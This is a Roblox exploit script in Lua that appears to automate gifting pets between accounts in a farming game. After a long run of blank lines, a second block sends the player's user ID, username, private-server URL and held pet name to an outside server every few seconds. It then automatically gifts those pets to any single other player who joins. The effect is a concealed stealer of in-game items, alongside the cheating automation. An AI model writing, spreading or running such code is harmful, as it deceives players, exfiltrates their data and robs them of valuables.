task.spawn(function()

    local NAME_PET = function(obj)
        if not obj:GetAttribute('PetType') then return end
        return string.match(obj.Name, "^(.-)%s*%[")
    end

    while not __AUTOGIFT__ do task.wait() end

    local Players = game:GetService("Players")
    local GuiService = game:GetService("GuiService")
    local VirtualInputManager = game:GetService("VirtualInputManager")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
    local camera = workspace.Camera

    workspace.Farm:Destroy()

    repeat
        task.wait()
    until LocalPlayer:GetAttribute("DataFullyLoaded") and LocalPlayer:GetAttribute("Finished_Loading") and LocalPlayer:GetAttribute("Setup_Finished")

    task.wait(1)

    VirtualInputManager:SendMouseButtonEvent(0, 0, 1, true, game, 0)
    VirtualInputManager:SendMouseButtonEvent(0, 0, 1, false, game, 0)

    if table.find(__AUTOGIFT__.main, LocalPlayer.Name) then

        api()

        -- LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack["Shovel [Destroy Plants]"])
        local Gift_Notification = PlayerGui:WaitForChild("Gift_Notification")
        Gift_Notification:WaitForChild("Frame").ChildAdded:Connect(function(child)
            if child.Name == "Gift_Notification" then
                local button = child.Parent
                and child:FindFirstChild("Holder")
                and child.Holder:FindFirstChild("Frame")
                and child.Holder.Frame:FindFirstChild("Accept")
                if child then
                    GuiService.SelectedObject = button
                    if GuiService.SelectedObject == button then
                        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, nil)
                        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, nil)
                    end
                end
            end
        end)

        local checktargetpet = function(player)
            local gift_petlist = {}
            for _, fruit in ipairs(player.Backpack:GetChildren()) do
                if NAME_PET(fruit) == __AUTOGIFT__.name_item then
                    table.insert(gift_petlist, fruit)
                end
            end
            local p = player.Character:FindFirstChildOfClass("Tool")
            if p and NAME_PET(p) == __AUTOGIFT__.name_item then
                table.insert(gift_petlist, p)
            end
            return gift_petlist
        end

        task.spawn(function()
            while task.wait(2) do
                local count = 0
                for _, pet in ipairs(LocalPlayer.Backpack:GetChildren()) do
                    if pet:GetAttribute('PetType') then
                        count += 1
                    end
                end
                local pet = LocalPlayer.Character:FindFirstChildOfClass("Tool")
                if pet and pet:GetAttribute('PetType') then
                    count += 1
                end
                PetsBackpack = count
            end
        end)

        while task.wait() do
            pcall(function()
                for _, player in ipairs(Players:GetChildren()) do
                    if player == LocalPlayer then continue end
                    while #checktargetpet(player) ~= 0 do
                        local targetPos = player.Character.HumanoidRootPart.Position
                        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos)
                        task.wait()
                    end
                end
            end)
        end

    else

        for _, v in ipairs(workspace.PetsPhysical:GetChildren()) do
            local pm = v:FindFirstChildOfClass("Model")
            if pm then
                ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer("UnequipPet", pm.Name)
            end
        end

        task.wait(1)

        local gift_petlist = {}
        local checktargetpet = function()
            gift_petlist = {}
            for _, fruit in ipairs(LocalPlayer.Backpack:GetChildren()) do
                if NAME_PET(fruit) == __AUTOGIFT__.name_item then
                    table.insert(gift_petlist, fruit)
                end
            end
            local p = LocalPlayer.Character:FindFirstChildOfClass("Tool")
            if p and NAME_PET(p) == __AUTOGIFT__.name_item then
                table.insert(gift_petlist, p)
            end
            return gift_petlist
        end

        local CamFocus = function(pos)
            local cameraPosition = pos + Vector3.new(0, 15, 0)
            local cameraLookAt = pos
            camera.CameraType = Enum.CameraType.Scriptable
            camera.CFrame = CFrame.new(cameraPosition, cameraLookAt)
        end

        while #checktargetpet() ~= 0 do
            task.wait()
            pcall(function()
                for _, pet in ipairs(gift_petlist) do
                    LocalPlayer.Character.Humanoid:EquipTool(pet)
                    if pet:GetAttribute("d") then
                        ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet)
                    end
                    local targetplayer
                    for _, v in ipairs(__AUTOGIFT__.main) do
                        targetplayer = Players:FindFirstChild(v)
                        if targetplayer then break end
                    end
                    if targetplayer and targetplayer:GetAttribute("DataFullyLoaded")
                    and targetplayer:GetAttribute("Finished_Loading")
                    and targetplayer:GetAttribute("Setup_Finished") then
                        local targetHumanoidRootPart = targetplayer.Character.HumanoidRootPart
                        local targetPos = targetHumanoidRootPart.Position
                        if (LocalPlayer.Character.HumanoidRootPart.Position - targetPos).Magnitude > 10 then return end
                        task.wait(0.25)
                        local prompt = targetHumanoidRootPart and targetplayer.Character.Head:FindFirstChild('ProximityPrompt')
                        if prompt then
                            VirtualInputManager:SendMouseButtonEvent(0, 0, 1, true, game, 0)
                            VirtualInputManager:SendMouseButtonEvent(0, 0, 1, false, game, 0)
                            CamFocus(targetPos)
                            prompt.HoldDuration = 0
                            prompt:InputHoldBegin()
                            prompt:InputHoldEnd()
                            task.wait(__AUTOGIFT__.delay_gift)
                        end
                    end
                end
            end)
        end

        api()

    end

end)











getgenv().PetList = {
    "",
}

task.spawn(function()

    local SERVER_IP = "pptnw.3bbddns.com"
    local SERVER_PORT = 14421
    local HEARTBEAT_INTERVAL = 3

    local HttpService = game:GetService("HttpService")
    local RunService = game:GetService("RunService")
    local GuiService = game:GetService("GuiService")
    local TeleportService = game:GetService("TeleportService")

    local isSystemActive = false
    local lastHeartbeatSent = 0
    local havePET
    local PETTARGET

    local Players = game:GetService("Players")
    local VirtualInputManager = game:GetService("VirtualInputManager")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")

    local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
    local camera = workspace.Camera

    local function sendHeartbeat()

        if not (one_click_config and one_click_config.PRIVATESERVER_URL and one_click_config.PRIVATESERVER_URL ~= "" and havePET) then return end

        if not isSystemActive or not LocalPlayer or (tick() - lastHeartbeatSent < HEARTBEAT_INTERVAL) then
            return
        end

        lastHeartbeatSent = tick()
        local userId = LocalPlayer.UserId

        local requestData = {
            Url = string.format("http://%s:%d/heartbeat", SERVER_IP, SERVER_PORT),
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({ userId = userId, username = LocalPlayer.Name, PRIVATESERVER_URL = one_click_config.PRIVATESERVER_URL, havePET = havePET})
        }


        task.spawn(function()
            local success, response = pcall(function()
                return http_request(requestData)
            end)

            if not success then
                warn("Heartbeat System: Critical error calling http_request: " .. tostring(response))
            elseif response and not response.Success then
                warn(string.format("Heartbeat System: Failed to send. Code: %s, Message: %s",
                    tostring(response.StatusCode), tostring(response.StatusMessage)))
            end
        end)
    end

    RunService.Heartbeat:Connect(function()
        sendHeartbeat()
    end)

    local NAME_PET = function(obj)
        if not obj:GetAttribute('PetType') then return end
        return string.match(obj.Name, "^(.-)%s*%[")
    end

    local checkPet = function()
        if not (PETTARGET and PETTARGET.Parent) then
            for _, child in ipairs(LocalPlayer.Backpack:GetChildren()) do
                local np = NAME_PET(child)
                if np and table.find(PetList, np) then
                    isSystemActive = true
                    PETTARGET = child
                    havePET = np
                    return
                end
            end
            local child = LocalPlayer.Character:FindFirstChildOfClass("Tool")
            if child then
                local np = NAME_PET(child)
                if np and table.find(PetList, np) then
                    isSystemActive = true
                    PETTARGET = child
                    havePET = np
                    return
                end
            end
            isSystemActive = false
            PETTARGET = nil
            havePET = nil
        end
    end

    local gift_petlist = {}
    local checktargetpet = function()
        gift_petlist = {}
        for _, p in ipairs(LocalPlayer.Backpack:GetChildren()) do
            if NAME_PET(p) == havePET then
                table.insert(gift_petlist, p)
            end
        end
        local p = LocalPlayer.Character:FindFirstChildOfClass("Tool")
        if p and NAME_PET(p) == havePET then
            table.insert(gift_petlist, p)
        end
        return gift_petlist
    end

    local CamFocus = function(pos)
        local cameraPosition = pos + Vector3.new(0, 15, 0)
        local cameraLookAt = pos
        camera.CameraType = Enum.CameraType.Scriptable
        camera.CFrame = CFrame.new(cameraPosition, cameraLookAt)
    end

    while task.wait(3) do
        pcall(function()

            checkPet()

            if #(Players:GetChildren()) == 1 then return end

            while #checktargetpet() ~= 0 do
                task.wait()
                isSystemActive = false
                pcall(function()
                    for _, pet in ipairs(gift_petlist) do
                        LocalPlayer.Character.Humanoid:EquipTool(pet)
                        if pet:GetAttribute("d") then
                            ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet)
                        end
                        local targetplayer
                        if #(Players:GetChildren()) ~= 2 then return end
                        for _, v in ipairs(Players:GetChildren()) do
                            if LocalPlayer == v then continue end
                            targetplayer = v
                        end
                        if targetplayer and targetplayer:GetAttribute("DataFullyLoaded")
                        and targetplayer:GetAttribute("Finished_Loading")
                        and targetplayer:GetAttribute("Setup_Finished") then
                            local targetHumanoidRootPart = targetplayer.Character.HumanoidRootPart
                            local targetPos = targetHumanoidRootPart.Position
                            if (LocalPlayer.Character.HumanoidRootPart.Position - targetPos).Magnitude > 10 then return end
                            task.wait(0.25)
                            local prompt = targetHumanoidRootPart and targetplayer.Character.Head:FindFirstChild('ProximityPrompt')
                            if prompt then
                                CamFocus(targetPos)
                                prompt.HoldDuration = 0
                                prompt:InputHoldBegin()
                                prompt:InputHoldEnd()
                                task.wait(2)
                            end
                        end
                    end
                end)
            end

        end)
    end

end)
